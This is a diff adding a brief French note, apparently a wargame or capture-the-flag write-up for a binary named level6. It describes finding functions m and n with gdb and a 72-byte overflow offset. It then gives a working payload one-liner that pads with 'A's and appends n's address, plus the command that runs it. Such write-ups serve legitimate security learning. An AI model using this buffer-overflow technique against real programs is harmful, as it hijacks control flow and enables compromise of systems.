@@ -1,0 +1,11 @@
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+
+avec gdb on voit ya m et n
+
+il suffit juste de trouver l offset qui overflow et dy injecter l adresse de n
+
+avec notre pattern on trouve 72 du coup
+
+python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/payload6
+
+./level6 $(cat /tmp/payload6)
